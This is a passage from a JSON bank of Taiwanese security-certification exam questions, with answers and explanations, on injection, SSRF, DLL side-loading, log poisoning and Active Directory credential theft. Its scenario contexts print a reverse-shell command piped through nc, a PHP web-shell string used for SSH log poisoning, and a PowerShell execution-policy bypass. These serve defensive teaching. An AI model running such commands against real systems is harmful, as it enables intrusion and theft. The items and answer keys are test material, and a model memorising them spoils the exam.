     "stem": "情境如附圖所示。在你自覺到公司的網站伺服器可能入侵的同時，你發現在資料庫伺服器的工作排程中出現了一個名為 windows update 的工作，執行的內容如附圖二所示。請問對於 windows update 的工作內容描述，下列何者正確？",
     "options": [
      "這是段 Powershell，它試圖在背景執行，且會產出一個名為 LSASS 的 Script",
      "就說明看來它應該 Windows 更新工作",
      "這是段 Powershell，它試圖略過執行政策並且轉換 Script 為執行檔",
      "就說明看來它應該是會產生一支可進行 Windows 更新的檔案"
     ],
     "answer": 2,
     "context": "您的安全團隊在公司的網站伺服器上發現了異常的入侵跡像，資料庫似乎遭受了注入攻擊，且在 Active Directory（AD）主機上發現了未知的高權限帳號。這些跡象都代表了可能有一個進階持續性威脅（Advanced Persistent Threat，APT）組織在進行攻擊。\n附圖二\npowershell.exe -ExecutionPolicy bypass  -command \"&'.\\svchost.ps1' -inputFile 'LSASS.ps1' -outputFile 'Winupdate.exe'\"",
     "hint": "逐一拆解排程命令的每個參數代表什麼，再判斷每個選項的描述是否與命令實際行為相符。",
     "explanation": "答案 C。指令 powershell.exe -ExecutionPolicy bypass -command \"&'.\\svchost.ps1' -inputFile 'LSASS.ps1' -outputFile 'Winupdate.exe'\" 是用略過執行政策的 PowerShell，執行名為 svchost.ps1 的腳本，把 LSASS.ps1 當輸入、轉成輸出的 Winupdate.exe（腳本轉執行檔）。A 錯在 LSASS.ps1 是輸入、不是被產出的檔案；B、D 受排程名稱 windows update 誤導，但實際內容並非更新工作。",
     "source": "114-1 第6題"
    },
    {
     "stem": "勒索軟體與資料外洩攻擊之準備、預防、緩解與應變之實務上，可透過分析系統執行特定指令來進行威脅獵補（Threat hunting），以即早偵測並發現異常行為。下列何種 Windows 指令「非」勒索軟體常用於竄改系統檔案/備份之目的？",
     "options": [
      "fsutil.exe",
      "ntfsbackup.exe",
      "vssadmin.exe",
      "wbadmin.exe"
     ],
     "answer": 1,
     "hint": "題目問『非』：回想勒索軟體為了讓你無法還原，通常會動到哪幾類管理工具，再挑不常出現者。",
     "explanation": "答案 B。勒索軟體為了讓受害者無法還原，常用 Windows 內建的 vssadmin（刪除陰影複本）、wbadmin（刪除備份與備份目錄）、fsutil（例如刪除 USN 變更日誌）來破壞還原能力。ntfsbackup.exe 不是 Windows 內建的指令（舊版 Windows 的備份程式叫 ntbackup.exe，Vista／Server 2008 起已由 wbadmin 取代），不屬於勒索軟體常用來竄改系統檔案或備份的工具，所以選 B。",
     "source": "114-1 第9題"
    },
    {
     "stem": "如附圖所示，下面何項行為最有可能驗證 ExampleApp.exe 存在 DLL Side Loading 漏洞？",
     "options": [
      "在 C:\\Windows\\System32\\ 資料夾放置惡意 ExampleLib.dll，觀察是否被載入",
      "在 C:\\Temp\\ 資料夾放置惡意 ExampleLib.dll，並修改環境變數 PATH 指向該路徑",
      "在 C:\\Program Files\\ExampleApp\\ 資料夾放置惡意 ExampleLib.dll，並檢查是否覆蓋合法 DLL",
      "在 C:\\Temp\\ 資料夾放置惡意 ExampleLib.dll，觀察是否被載入"
     ],
     "answer": 1,
     "context": "在滲透測試過程中，發現公司內某一個合法的應用程式 ExampleApp.exe 出現 DLL Side Loading 漏洞。以下是分析 ExampleApp.exe 後相關條件：\n條件一：ExampleApp.exe 啟動時會自動加載 ExampleLib.dll 動態連結函式庫（DLL）。\n條件二：ExampleApp.exe 對 DLL 檔的搜尋順序如下(1>2>3)：\n1. 搜尋應用程式執行目錄\n2. 搜尋 Windows OS 系統目錄 (C:\\Windows\\System32\\)\n3. 搜尋環境變數 PATH 所指定路徑\n條件三：分析發現可以將檔案寫入 C:\\Temp\\某一個資料夾。\n\n假設攻擊者嘗試利用這個 DLL Side Loading 漏洞，製造一個惡意 Malware_ExampleLib.dll，讓它在 ExampleApp.exe 啟動時被加載並執行。惡意 DLL 的目的是記錄「攻擊成功」的訊息存到檔案 C:\\Temp\\attack_log.txt",
     "hint": "先把條件寫成一張表：哪些位置會被搜尋、哪些位置攻擊者能寫，再找兩者交集。",
     "explanation": "答案 B。DLL 搜尋順序為應用程式目錄 > System32 > PATH，而攻擊者只能寫入 C:\\Temp\\ 的某個資料夾。若要驗證漏洞，需讓惡意 DLL 所在路徑被搜尋到，B 在 C:\\Temp\\ 放惡意 DLL 並修改 PATH 指向該路徑，才讓載入流程能走到它（官方採 B）。A 攻擊者沒有寫入 System32 的條件；C 應用程式目錄不在已知可寫入範圍內，且題目只要求驗證載入、不是覆蓋合法 DLL；D 只放在 C:\\Temp\\ 而不在任何搜尋路徑內，不會被載入。",
     "source": "114-1 第30題"
    },
    {
     "stem": "情境如附圖所示。承上題，你把該檔案移除之後，你發現系統中仍然有人在執行攻擊指令，你推測可能是紅隊人員在取得系統控制權之後，有執行一連串維持權限（Persistence）的動作。請問以下哪些是紅隊人員用來維持權限的技巧？",
     "options": [
      "使用知名的連線工具 nc，輸入 nc 127.0.0.1 22 這個指令就可以建立後門",
      "將 SSH 的登入金鑰寫入 ~/.ssh/known_hosts，以便可以使用 SSH 登入作業系統",
      "將反向連線指令寫入到 ~/.bashrc 檔案中，導致使用者一登入就會觸發反向連線",
      "將指令寫入 crontab，每小時定期執行反向連線程式"
     ],
     "answer": [
      2,
      3
     ],
     "context": "你是一位企業的藍隊防禦專家，目前你的企業正在進行紅隊演練，今天你忽然收到來自 EDR 的告警，顯示昨天某台伺服器已經被攻擊者取得控制權，於是你開始對這個檔案以及背後的紅隊攻擊行動展開調查。",
     "hint": "持久化的關鍵是『之後會自動再執行』；逐項問：這個動作會不會在重開機、登入或定時後自己觸發？",
     "explanation": "答案 C、D。維持權限（Persistence）常見做法是讓系統在登入或定時自動執行攻擊者的程式：C 把反向連線指令寫進 ~/.bashrc，使用者一登入就觸發；D 寫入 crontab 定時執行。A nc 127.0.0.1 22 只是連到本機的 SSH 服務，並不會建立後門；B known_hosts 記錄的是『伺服器的公鑰』，用來驗證遠端主機，要放自己的登入公鑰應寫入 authorized_keys，所以不成立。",
     "source": "114-1 第36題"
    },
    {
     "stem": "關於源碼檢測，下列哪些正確描述了 DLL Side Loading？",
     "options": [
      "DLL Side Loading 涉及到替換正常的 DLL 文件",
      "通常被用來繞過安全措施並執行惡意程式碼",
      "此技術概念僅可以在 Linux 系統上實現",
      "DLL Side Loading 可以利用合法軟體的加載行為來隱藏惡意活動"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "hint": "逐項回想這項攻擊技術的原理、用途與適用的作業系統，判斷每句是否成立。",
     "explanation": "答案 A、B、D。DLL Side Loading 是利用合法程式載入 DLL 的行為：A 攻擊者替換或放置惡意 DLL；B 常被用來繞過安全措施並執行惡意程式碼；D 利用合法軟體的載入行為隱藏惡意活動。C 說概念僅可在 Linux 實現是錯的，因為 DLL 是 Windows 的動態連結函式庫機制。",
     "source": "113-1 第31題"
    }
   ]
  },
  {
   "id": "1.1-05",
   "section": "1.1",
   "title": "XSS、CSRF 與 SSRF 判讀",
   "examHits": 8,
   "examRefs": [
    "115-2 第2題",
    "115-2 第4題",
    "114-2 第2題",
    "111-1 第4題",
    "110-1 第2題",
    "109-1 第15題",
    "109-1 第18題",
    "108-1 第16題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "跨站與伺服器端請求偽造常見在「誰信任誰」這點出題。XSS 是攻擊者讓網站把惡意腳本送到受害者瀏覽器執行，利用的是瀏覽器對該網站的信任，可竊取 Cookie 後冒用 Session；若 Session Cookie 設了 HttpOnly，腳本就讀不到。CSRF 是誘使已登入的使用者在不知情下送出請求，利用的是伺服器對瀏覽器（使用者身分）的信任。SSRF 則是讓伺服器代替攻擊者去發請求，常出現在可輸入網址、跳轉或抓圖片的參數，可探測內網、讀取 file://、gopher://、dict:// 等協定的內容。考題常用它們的信任方向與可造成的後果來區分。",
   "keyPoints": [
    "看到「竊取 Cookie 冒用 Session」→ 身分偽造（Impersonation）；XSS 的必要條件之一是 Session Cookie 未設 HttpOnly 時腳本才讀得到。",
    "看到「已登入使用者被騙點連結，在不知情下送出請求」→ CSRF，利用伺服器對瀏覽器的信任；XSS 則是利用瀏覽器對伺服器（網站）的信任。",
    "看到「可輸入網址、跳轉、抓圖的參數」→ 想 SSRF：可掃內網埠、打 127.0.0.1／localhost、用 file://、gopher://、dict:// 存取資源。",
    "看到「用黑名單過濾私有網段就能防 SSRF」→ 不可靠，名單容易被繞過，要搭配白名單、網路隔離與限制協定。",
    "SSRF 的危害不小：能到內網、雲端中繼資料與本機服務，不能因為「只是發請求」就輕忽。"
   ],
   "trap": "把 XSS 與 CSRF 的信任方向講反，或相信「過濾掉內網 IP 字串」就能防 SSRF。",
   "quiz": [
    {
     "stem": "攻擊者利用跨站腳本攻擊（Cross-Site Scripting, XSS）竊取Cookie，進而冒用使用者會話（Session），這種行為屬於下列何種威脅？",
     "options": [
      "網路竊聽（Sniffing）",
      "水坑攻擊（Watering Hole）",
      "身分偽造（Impersonation）",
      "權限提升（Privilege Escalation）"
     ],
     "answer": 2,
     "hint": "回想各威脅類型的定義，逐項判斷：盜用 Cookie 冒用 Session 這個行為符合哪一個定義？",
     "explanation": "答案 C。竊取 Cookie 後冒用使用者的 Session，是以他人身分行動，屬身分偽造（Impersonation）。A 網路竊聽是攔截傳輸中的封包；B 水坑攻擊是在目標常去的網站放惡意內容；D 權限提升是取得比原本更高的權限，這裡是冒用同一個使用者而非提高層級。",
     "source": "115-2 第2題"
    },
    {
     "stem": "關於伺服器偽造請求（Server-Side Request Forgery，SSRF）的描述，下列哪些選項較為正確？",
     "options": [
      "此類弱點通常發生在跳轉網址或讀取特定網址圖片的參數沒有過濾內容，導致被攻擊者利用",
      "此類弱點無法用於掃描內網其他伺服器的port，所以危害很小",
      "此類弱點可以用來讀取其他URL協議，例如file://、ftp://、gopher://",
      "此類弱點無法用來掃描127.0.0.1或localhost"
     ],
     "answer": [
      0,
      2
     ],
     "hint": "把 SSRF 的本質講一句話：伺服器被騙去幫攻擊者發請求；然後想它能到哪些地方、用哪些協定。",
     "explanation": "答案 A、C。SSRF 常出現在跳轉網址或讀取特定網址圖片的參數，沒過濾就會被利用（A）；它也能存取其他 URL 協定如 file://、ftp://、gopher://（C）。B 錯：SSRF 可用來掃描內網其他伺服器的埠，危害不小；D 錯：它可以掃描 127.0.0.1 或 localhost。",
     "source": "115-2 第4題"
    },
    {
     "stem": "伺服器端請求偽造（Server Side Request Forgery, SSRF）是過去幾年很流行的攻擊手法，下列關於 SSRF 的描述何項「錯誤」？",
     "options": [
      "有機會用來對內網進行 port scan",
      "有機會透過 file:// 協定讀取系統檔案，例如讀取 Linux 作業系統的 /etc/passwd",
      "只要使用正規表示式把 10.0.0.0 - 10.255.255.255、 172.16.0.0 - 172.31.255.255、192.168.0.0 - 192.168.255.255 從參數內容過濾掉，攻擊者就無法透過 SSRF 存取內網",
      "有機會透過 dict:// 協定存取 Redis 資料庫"
     ],
     "answer": 2,
     "hint": "逐項回想 SSRF 能利用的協定、能觸及的目標，以及常見防禦方式的限制，判斷每句是否成立。",
     "explanation": "答案 C。用正規表示式濾掉 10.0.0.0/8、172.16.0.0/12、192.168.0.0/16 字串並不足以防 SSRF，攻擊者可改用其他 IP 寫法、讓網域解析到內網位址或利用重新導向等方式繞過，所以 C 的說法錯誤。A 可探測內網埠、B 可用 file:// 讀取 /etc/passwd、D 可用 dict:// 打 Redis，都是 SSRF 的已知用法。",
     "source": "114-2 第2題"
    },
    {
     "stem": "一位資安專家正在對某公司網站進行滲透測試，在測試期間發現了一個跨網站指令碼（Cross-Site Scripting, XSS）的網站安全漏洞，若要針對此弱點進行有效攻擊，需同時符合下列何項條件？",
     "options": [
      "網站的安全旗標（secure flag）未設定",
      "連線期間快取（session cookie）的 HttpOnly旗標未設定",
      "受害電腦沒有安裝端點防護軟體",
      "受害電腦的瀏覽器需開啟 Active D技術"
     ],
     "answer": 1,
     "hint": "回想 XSS 竊取資料的方式與各個 Cookie 安全旗標的作用，逐項判斷哪個條件是攻擊得手所必需。",
     "explanation": "答案 B。XSS 要讓腳本偷到工作階段，常需要連線期間的 Session Cookie 未設 HttpOnly 旗標，腳本才讀得到 Cookie。A Secure 旗標是限制 Cookie 只經 HTTPS 傳送，與 XSS 是否能讀取無必然關係；C 受害電腦有無端點防護不是 XSS 成立的必要條件；D 要求特定瀏覽器技術並非 XSS 的必要條件。",
     "source": "111-1 第4題"
    },
    {
     "stem": "關於跨站請求偽造（Cross-Site Request Forgery, CSRF or XSRF）與跨站腳本攻擊（Cross-Site Scripting, XSS）的比較，下列敘述何者較正確？",
     "options": [
      "兩者都是利用瀏覽器（Browser）對伺服器端（Server site）的信任",
      "兩者都是利用伺服器端（Server site）對瀏覽器（Browser）的信任",
      "XSS 是利用伺服器端（Server site）對瀏覽器（Browser）的信任，CSRF是利用瀏覽器（Browser）對伺服器端（Server site）的信任",
      "CSRF是利用伺服器端（Server site）對瀏覽器（Browser）的信任，XSS 是利用瀏覽器（Browser）對伺服器端（Server site）的信任"
     ],
     "answer": 3,
     "hint": "分別回想 CSRF 與 XSS 的攻擊原理：各自濫用了哪一方對哪一方的信任？再逐項比對。",
     "explanation": "答案 D。CSRF 是利用伺服器對瀏覽器（已登入使用者）的信任，把偽造的請求當成使用者本人送出；XSS 是利用瀏覽器對伺服器端（網站內容）的信任，讓惡意腳本在使用者瀏覽器裡執行。D 把兩者描述正確；C 剛好顛倒；A、B 說兩者信任方向相同，是錯的。",
     "source": "110-1 第2題"
    }
   ]
  },
  {
   "id": "1.1-06",
   "section": "1.1",
   "title": "注入與檔案包含攻擊判讀",
   "examHits": 8,
   "examRefs": [
    "114-2 第6題",
    "114-2 第33題",
    "114-1 第5題",
    "114-1 第38題",
    "112-2 第38題",
    "112-1 第2題",
    "110-1 第4題",
    "109-1 第35題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "看到可疑的輸入或日誌，先分辨它是在對哪一層做注入。SQL 注入是改變資料庫查詢（如 ' or 1=1 --）；命令注入是在系統指令後接 ; 或 && 再串自己的指令（如 127.0.0.1; sleep 5 用延遲確認、whoami 確認身分）；OGNL 注入出現在 Struts 2 這類框架，常透過 Content-Type 等 HTTP 標頭送入；LFI（本機檔案包含）是讓網站讀取伺服器上的檔案，若配合「日誌投毒」——把 PHP 程式碼寫進 auth.log（例如用帶程式碼的帳號名嘗試 SSH 登入），再用 LFI 包含該日誌就會執行。考題從日誌特徵問攻擊類型與攻擊者意圖。",
   "keyPoints": [
    "看到參數後接 ; sleep 5 或 && whoami → 命令注入（系統指令層），不是 SQL 注入；SQL 注入是資料庫語法如 SLEEP(5)、or 1=1。",
    "看到 auth.log 出現帶 <?php system($_GET[c]); ?> 的帳號名 → 日誌投毒，之後用 LFI 包含該日誌執行；Web access log 的 URI 會看到 c=指令。",
    "看到 HTTP 標頭被插入 OGNL 語法 → Struts 2 類框架漏洞（官方題以 Content-Type 為答案）。",
    "LFI 的核心風險是『讀取伺服器上本不該公開的檔案』（設定檔、帳密、日誌），不直接等於取得管理員權限或關機。",
    "判斷時看語法的『語言』：SQL、Shell、OGNL、PHP 各有特徵，對應到不同的弱點類別。"
   ],
   "trap": "看到 sleep 就想 SQL 注入，或看到日誌中的程式碼就以為是登入失敗而已；LFI 與日誌投毒的連動關係容易被漏看。",
   "quiz": [
    {
     "stem": "情境如附圖所示。以這個案例來說，施測人員用於執行 OGNL 語法的 HTTP Header 最有可能是下列何者？",
     "options": [
      "Accept-Language",
      "Cache-Control",
      "Content-Type",
      "Origin"
     ],
     "answer": 2,
     "context": "某醫療資訊系統採用 Apache Struts 2 作為開發框架，且版本未及時更新。該醫院在做紅隊演練時，施測人員發現可透過特定 HTTP 請求，於 HTTP Header 中對醫療資訊系統插入惡意 OGNL（Object Graph Navigation Language）語法，成功在系統上遠端執行任意指令（RCE），取得 Shell 權限。施測人員進一步利用此權限，在內網大量掃描，並且進行橫向移動（Lateral Movement），最終施測人員找到資料庫的伺服器，並且以預設帳號密碼登入，竊取大量病患的醫療資料，若這個漏洞被攻擊者利用，將會造成嚴重的機密資料外洩事件。",
     "hint": "回想 Struts 2 OGNL 漏洞案例是從哪個標頭被解析時出事的。",
     "explanation": "答案 C。官方採 C（Content-Type）。Struts 2 的 OGNL 遠端執行漏洞（著名案例為 CVE-2017-5638）是透過 Content-Type 標頭被解析而觸發（Apache 公告 S2-045：Jakarta Multipart 解析器處理錯誤的 Content-Type 時會執行其中的 OGNL）。A Accept-Language、B Cache-Control、D Origin 在該情境下不是典型被當成 OGNL 注入入口的標頭。",
     "source": "114-2 第6題"
    },
    {
     "stem": "情境如附圖所示。請問這些日誌內容裡面的「127.0.0.1; sleep 5」，最有可能是發生下列哪一種攻擊情境？",
     "options": [
      "攻擊者想確認該功能是否存在資料庫注入攻擊（SQL Injection）",
      "攻擊者想確認該功能是否存在反序列化攻擊（Insecure Deserialization）",
      "攻擊者想確認該功能是否存在指令注入攻擊（Command Injection）",
      "攻擊者想確認該功能是否存在資安記錄及監控失效（Security Logging and Monitoring Failures）"
     ],
     "answer": 2,
     "context": "你是一位企業的藍隊防禦專家，今天你忽然收到來自 SOC 的告警，顯示有某個伺服器正在發生異常行為，於是你開始對這個伺服器展開調查，評估是否有發生資安事件。\n你發現伺服器裡面有一個 ping 的功能，並且在該功能的網頁應用程式日誌裡面出現這種類型的內容：\n127.0.0.1; sleep 5\n127.0.0.1; whoami\n127.0.0.1; /bin/bash -i 2>&1 | nc 192.168.99.100 80 > /tmp/tmp.txt",
     "hint": "看注入點後面接的是哪一種語言的語法（SQL、Shell、其他），再對照名稱。",
     "explanation": "答案 C。127.0.0.1; sleep 5 是在 ping 功能的輸入後面接分號再串 sleep，觀察回應是否延遲 5 秒，用來確認是否可注入系統指令，屬命令注入（Command Injection）。A 的 SQL 注入要用資料庫語法；B 反序列化攻擊與此輸入格式無關；D 資安記錄及監控失效不是攻擊動作。",
     "source": "114-2 第33題"
    },
    {
     "stem": "情境如附圖所示。在進行例行性的檢查時，你發現在 WEB 主機上，出現了附圖一的 log 記錄，這個 log 記錄中，出現了登入錯誤的訊息，但這個訊息恐怕不是登入錯誤而已，這樣的 log 記錄內容，你可能已經遭受到下列何種攻擊？",
     "options": [
      "修改網站的配置文件以獲得管理員權限",
      "利用 SQL 注入漏洞來控制資料庫，進而執行代碼",
      "通過注入惡意指令到 SSH 日誌文件中，然後通過 LFI（Local File Inclusion）加載該日誌文件來執行惡意指令",
      "網站被發起了 XSS Server Side 的攻擊"
     ],
     "answer": 2,
     "context": "您的安全團隊在公司的網站伺服器上發現了異常的入侵跡像，資料庫似乎遭受了注入攻擊，且在 Active Directory（AD）主機上發現了未知的高權限帳號。這些跡象都代表了可能有一個進階持續性威脅（Advanced Persistent Threat，APT）組織在進行攻擊。\n附圖一\nroot@kali-vk9:/var/log# tail -n 5 -f auth.log\nJan 19 11:30:49 kali-vk9 sshd[3405]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.0.13\nJan 19 11:30:51 kali-vk9 sshd[3405]: Failed password for invalid user <?php system($_GET[c]); ?> from 192.168.0.13 port 42962 ssh2\nJan 19 11:35:01 kali-vk9 CRON[3453]: pam_unix(cron:session): session opened for user root by (uid=0)\nJan 19 11:35:01 kali-vk9 CRON[3453]: pam_unix(cron:session): session closed for user root\nJan 19 11:37:34 kali-vk9 sshd[3464]: Invalid user vry4n from 192.168.0.13 port 43292\nJan 19 11:38:47 kali-vk9 sshd[3464]: Connection closed by invalid user vry4n 192.168.0.13 port 43292 [preauth]\nJan 19 11:38:54 kali-vk9 sshd[3475]: Invalid user vk9sec from 192.168.0.13 port 43294\nJan 19 11:39:01 kali-vk9 CRON[3477]: pam_unix(cron:session): session opened for user root by (uid=0)\nJan 19 11:39:01 kali-vk9 CRON[3477]: pam_unix(cron:session): session closed for user root",
     "hint": "先找出日誌哪個欄位的內容異常，再逐項判斷：選項描述的攻擊流程能否解釋這筆日誌？",
     "explanation": "答案 C。附圖一的 auth.log 出現『Failed password for invalid user <?php system($_GET[c]); ?>』：攻擊者把 PHP 程式碼當作 SSH 帳號名寫進日誌（日誌投毒），再配合網站的 LFI 包含該日誌檔就能執行指令，C 描述正確。A 修改網站設定檔與日誌內容無關；B 日誌中沒有 SQL 注入語法；D 沒有 XSS 特徵，且 XSS 是跑在瀏覽器端。",
     "source": "114-1 第5題"
    },
    {
     "stem": "情境如附圖所示。檢測人員在利用 SQL 注入（SQL Injection）成功後，發現在/var/logs/AUTH.log 中，出現了一個名為 '<?php system($_GET['c']); ?>' 的帳號嘗試登入該主機，如果這網網站存在 LFI（Local File Inclusion）弱點時，可以從 Web access log 中的 uri query string 找到什麼特徵？",
     "options": [
      "C= '' or 1=1 - -",
      "C=alert(document.cookie)",
      "C=whoami && ip addr && hostname",
      "C=SLEEP(5)"
     ],
     "answer": 2,
     "context": "某次針對我國人民而言，極為重要的金融網站服務主機的安全測試中，你身為一名安全測試人員，被指派並接受任務，對一個公開運行的網站系統進行詳細檢查。該網站系統為組織自行開發，主要功能包括用戶查詢和管理操作，後端連接了一個關聯式資料庫。這次測試的目的是發現系統可能存在的安全漏洞，並為後續修復提供依據。\n● 初步階段：弱點掃描\n測試開始時，測試人員先利用自動化弱點掃描工具，對整個網站進行全面檢查。掃描範圍涵蓋常見漏洞，包括資料庫安全、權限管理以及前端輸入驗證。工具標記出幾個高風險區域，表明系統的某些功能可能存在問題，例如輸入處理不當和角色驗證的漏洞。這些提示成為後續滲透測試的重點。\n● 滲透測試過程\n測試人員建立了兩個測試用戶，模擬不同權限層級的操作情境：\n高權限用戶：具備管理功能，可以操作敏感資料和設定系統參數。\n低權限用戶：僅限於基本查詢功能，權限受限。\n● 測試步驟\n測試人員根據弱點掃描的線索進行詳細分析，測試的方向集中於兩個方面：\n1. 測試輸入處理功能的安全性，檢查是否能夠通過特殊輸入進一步存取敏感資源。\n2. 測試權限機制，模擬低權限用戶試圖存取高權限功能的情境，檢查系統是否有足夠的防護措施來防止權限提升。\n3. 在測試過程中，測試人員發現某些功能設計中，存在邏輯缺陷，使得低權限用戶可以通過特定操作存取到高權限界面。這些問題進一步證實了弱點掃描的發現。",
     "hint": "想想日誌裡的 PHP 程式碼等著什麼參數餵給它，那個參數在 URL 裡會長得像什麼。",
     "explanation": "答案 C。惡意帳號名 <?php system($_GET['c']); ?> 已被寫進 auth.log，若網站有 LFI 讓應用程式包含該日誌，攻擊者就會在網址帶 c=指令，所以 Web access log 的 query string 會出現類似 c=whoami && ip addr && hostname 的指令。A 是 SQL 注入；B 是 XSS；D 是時間型 SQL 注入特徵，都與 c 參數執行系統指令無關。",
     "source": "114-1 第38題"
    },
    {
     "stem": "情境如附圖所示。滲透測試者在報告中提及的本地文件讀取弱點，可能導致下列何項的安全風險？",
     "options": [
      "使攻擊者可以讀取到機密資訊",
      "使攻擊者可以關閉系統",
      "使攻擊者可以獲得系統管理員的權限",
      "使攻擊者可以對網路流量進行監控"
     ],
     "answer": 0,
     "context": "【題組5】\n您是 XYZ 公司的資訊安全負責人，公司正在進行滲透測試。在測試過程中，滲透測試者通報了一些嚴重的 Web 安全弱點，包括可以遠端執行指令的弱點和能夠讀取本地文件的弱點。\n並且成功的利用 auth.log 檔案的本地讀取及透過 SSH 驗證注入網站的應用程式達成遠端執行指令稿，使用測試人員可以透過 GitHub 下載 Reverse Shell 和各種編碼或編譯套件，透過這台主機上，發現了管理人員在 root 目錄下放置了帳號密碼檔，且這組帳號密碼經過測試，有大量的使用者可以用相同密碼登入。",
     "hint": "回想本地文件讀取弱點的成因與攻擊者能做到的事，逐項判斷選項的風險是否為它直接造成。",
     "explanation": "答案 A。本地檔案讀取（LFI）會讓攻擊者讀到伺服器上的機密資訊，例如設定檔、帳密、日誌。B 關閉系統、C 直接取得管理員權限、D 監控網路流量，都不是單靠讀取檔案能直接達成的。官方採 A。",
     "source": "112-2 第38題"
    }
   ]
  },
  {
   "id": "1.1-07",
   "section": "1.1",
   "title": "AD 憑證竊取與橫向移動",
   "examHits": 8,
   "examRefs": [
    "115-2 第21題",
    "115-1 第1題",
    "114-1 第7題",
    "113-2 第38題",
    "113-1 第34題",
    "113-1 第36題",
    "108-1 第37題",
    "108-1 第38題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "Active Directory 環境被入侵時，攻擊者會做的事有固定模式。從網域控制站取得認證資料（Credential Dumping）常見做法是存取 LSASS 記憶體、用 mimikatz，因此 DC 異常高 CPU 加上 LSASS 被非預期程式存取是警訊。看到資料夾裡一堆 .kirbi 檔（Kerberos 票證，含 krbtgt、ldap、cifs 服務票證）加上 mimikatz，是 Pass the Ticket；CrackMapExec（cme）的輸出含 SMB、(Pwn3d!)、Dumping LSA secrets 與 .cme 日誌路徑。盤點 AD 權限與關聯可用 BloodHound，紅藍隊都用。偵察指令像 net user、dig axfr、nmcli 也要看語法是否正確。",
   "keyPoints": [
    "看到 DC 高 CPU、LSASS 被非預期程式存取 → Credential Dumping（取認證資料），不是帳號填充或 Zerologon（那是對 Netlogon 的網路攻擊）。",
    "看到大量 .kirbi 票證檔（krbtgt、ldap、cifs）與 mimikatz → Pass the Ticket（Kerberos 票證重放）。",
    "看到 SMB、445、(Pwn3d!)、Dumping LSA secrets、.cme/logs → CrackMapExec 的輸出，不是 mimikatz 的存檔或一般偵錯日誌。",
    "想盤點 AD 的關連性與權限路徑 → BloodHound；Snort 是入侵偵測、OpenVAS 是弱點掃描、Nmap 是埠掃描，不是畫 AD 關係圖。",
    "偵察指令要看語法與用途是否相符：net user 列帳號、dig axfr 嘗試區域轉送、nmcli dev show 看網路與 DNS 資訊。"
   ],
   "trap": "把 DCSync、Zerologon、Pass the Ticket、Credential Dumping 混為一談；它們用的資料來源與痕跡不同。",
   "quiz": [
    {
     "stem": "企業內部的某一台AD Domain Controller（網域控制站）伺服器忽然出現異常高CPU 使用率，且資安工程師同時觀察到 LSASS（本機安全認證子系統服務）流程被非預期程式存取。若以事件應變的角度來評估，下列何項最有可能是伺服器目前正面臨的威脅？",
     "options": [
      "攻擊者正在進行Credential Stuffing，但是為了避免鎖定帳號，只嘗試了兩次就停止了",
      "攻擊者想要變更當前使用者的群組",
      "攻擊者正在利用Zerologon漏洞，想取得AD 伺服器控制權",
      "攻擊者正在進行Credential Dumping，想撈取AD伺服器機敏資料"
     ],
     "answer": 3,
     "hint": "回想 LSASS 的功能與各攻擊手法會留下的跡象，逐項判斷哪一個能同時解釋題幹的兩個現象。",
     "explanation": "答案 D。AD 網域控制站 CPU 異常高，同時 LSASS（儲存認證資料的程序）被非預期程式存取，是取出認證資料的典型徵兆，屬 Credential Dumping。A 憑證填充（Credential Stuffing）是用外洩帳密試登入，不會去存取 LSASS；B 變更使用者群組並不涉及 LSASS 被讀取；C Zerologon 是針對 Netlogon 協定的漏洞，不是以存取 LSASS 為特徵。",
     "source": "115-2 第21題"
    },
    {
     "stem": "下列何項工具可以用來盤點 Windows Server Active Directory（AD）的關連性及權限設定，發現 AD 的潛在威脅，既可被紅隊成員拿來規劃內網檢測方向，也可以被藍隊成員用來規劃AD資安強化措施？",
     "options": [
      "BloodHound",
      "Snort",
      "OpenVAS",
      "Nmap"
     ],
     "answer": 0,
     "hint": "逐項回想每個工具的主要用途，判斷哪一個符合題目描述的功能與紅藍隊用途。",
     "explanation": "答案 A。BloodHound 能蒐集並以圖形分析 AD 的物件關聯與權限設定，找出潛在攻擊路徑，紅隊拿來規劃橫向移動，藍隊用來強化。B Snort 是網路入侵偵測／防禦；C OpenVAS 是弱點掃描器；D Nmap 是網路與埠掃描工具，都不是專做 AD 權限關聯分析。",
     "source": "115-1 第1題"
    },
    {
     "stem": "情境如附圖所示。當資安小組開始調查這個事件時，在 AD 主機上發現了附圖三的內容。請問你遭受了什麼類型的攻擊？",
     "options": [
      "你的組織受到了 Denial of Service 攻擊",
      "你的組織受到了 Pass the Ticket 攻擊",
      "你的組織受到了 Buffer Overflow 攻擊",
      "你的組織受到了 Directory Sync 攻擊"
     ],
     "answer": 1,
     "context": "您的安全團隊在公司的網站伺服器上發現了異常的入侵跡像，資料庫似乎遭受了注入攻擊，且在 Active Directory（AD）主機上發現了未知的高權限帳號。這些跡象都代表了可能有一個進階持續性威脅（Advanced Persistent Threat，APT）組織在進行攻擊。\n附圖三（Windows 檔案總管，路徑：This PC > Local Disk (C:) > Users > （遮蔽的使用者名稱）> Downloads；欄位：Name、Date modified、Type、Size）\n檔名（部分網域名稱被遮蔽），每個 .kirbi 檔的修改時間皆為 13/03/2021 16:24、類型 KIRBI File、大小 2 KB：\n[0;3e4]-0-0-40a50000-WEB1$@DNS-dc1.（遮蔽）.kirbi\n[0;3e4]-0-1-40a50000-WEB1$@HOST-DC1.（遮蔽）.kirbi\n[0;3e4]-0-2-40a50000-WEB1$@ldap-dc1.（遮蔽）.kirbi\n[0;3e4]-0-3-40a50000-WEB1$@cifs-dc1.（遮蔽）.kirbi\n[0;3e4]-2-0-60a10000-WEB1$@krbtgt-（遮蔽）.kirbi\n[0;3e4]-2-1-40e10000-WEB1$@krbtgt-（遮蔽）.kirbi\n[0;3e7]-0-0-40a50000-WEB1$@cifs-DC1.（遮蔽）.kirbi\n[0;3e7]-0-1-40a10000.kirbi\n[0;3e7]-0-2-40a50000-WEB1$@ldap-dc1.（遮蔽）.kirbi\n[0;3e7]-2-0-60a10000-WEB1$@krbtgt-（遮蔽）.kirbi\n[0;3e7]-2-1-40e10000-WEB1$@krbtgt-（遮蔽）.kirbi\n[0;14149a]-0-0-40a50000-bob_adm@ldap-DC1.（遮蔽）.kirbi\n[0;14149a]-0-1-40a50000-bob_adm@cifs-DC1.（遮蔽）.kirbi\n[0;14149a]-0-2-40a50000-bob_adm@LDAP-DC1（遮蔽）.kirbi\n[0;14149a]-2-0-60a100